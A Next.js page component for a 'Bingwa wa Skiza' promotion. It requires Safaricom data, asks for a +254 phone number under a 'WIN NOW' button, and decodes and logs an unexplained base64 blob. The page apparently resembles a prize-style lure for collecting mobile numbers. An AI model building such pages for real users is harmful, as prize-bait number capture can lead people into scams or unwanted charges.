"use client";

import Image from "next/image";
import { use, useEffect, useState } from "react";
import { useRouter } from "next/navigation"; // ✅ FIX: Correct router import

export default function CheckNetworkPage() {
  const [useSafdata, setUseSafdata] = useState(false);
  const [decodedResponse, setDecodedResponse] = useState("");


  const encodedString =
  "EHPTT4veswhDYZylNFDWH2ggX+WMVqpTtxspZ/3FL1cTViCfjfkj3bMFKCvwxc5bl+qketAEPaarrfuFyV70lJw/LSMm2pwiNQMs787o+YRYweJnGqDgKRaeEDVmRcdjEhUNwHieaiv3LVpIvY+hp523jFRQTgz6g0qq1+RFQakv5IyQArGIurFrhdQtrtZVWLkDuLfBMf2l0j7SVuNpmYKJ6nIv3bVcS67UhAXnOrRYtkxoXaxkxUM0dT7jTz0qsiihlGazDymljo7PIbSdE1fpDzvY0w0wfQ3Feflix0NhXWRMd99UCLfGcWzWN0IegQioerXe7Yz4XJJy91gMvWhf";

function decodeBase64(encodedString: string) {
  try {
    return atob(encodedString);
  } catch (error) {
    console.error("Base64 decoding failed:", error);
    return "Decoding Error";
  }
}

useEffect(() => {
  const decoded = decodeBase64(encodedString);
  console.log("Decoded String:", decoded);
}, []);
 

  useEffect(() => {
    async function checkNetwork() {
      try {
        const res = await fetch("/api/check-network");
        if (!res?.ok) {
          setUseSafdata(true);
        }
      } catch (error) {
        console.error("Failed to fetch network status:", error);
      }
    }

    checkNetwork();
  }, []); 

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-teal-100 p-4">
      <div className="bg-white p-6 rounded-2xl shadow-lg w-full max-w-md text-center">
        <h1 className="text-3xl font-bold text-teal-600">
          <span className="text-teal-600">Bingwa</span>
          <span className="text-red-500"> wa Skiza</span>
        </h1>
        {useSafdata ? (
          <p className="text-gray-600 mt-2 text-lg font-semibold text-red-500">
            Please use Safaricom Data
          </p>
        ) : (
          <>
            <p className="text-gray-600 mt-2">Enter your phone number</p>
            <div className="mt-4 flex items-center bg-teal-100 rounded-lg p-2">
              <span className="bg-teal-500 text-white px-3 py-2 rounded-l-lg">+254</span>
              <input
                type="tel"
                placeholder="790001111"
                className="w-full p-2 bg-transparent focus:outline-none text-red-500"
              />
            </div>
            <button className="mt-4 bg-orange-500 text-white py-2 px-6 rounded-lg text-lg font-bold shadow-md hover:bg-teal-600 cursor-pointer">
              WIN NOW
            </button>
          </>
        )}
      </div>
      <div className="mt-6 max-w-md">
        <Image
          src="/promo2.jpeg"
          alt="Promotion Banner"
          width={400}
          height={300}
          className="rounded-lg shadow-lg"
        />
      </div>
    </div>
  );
}
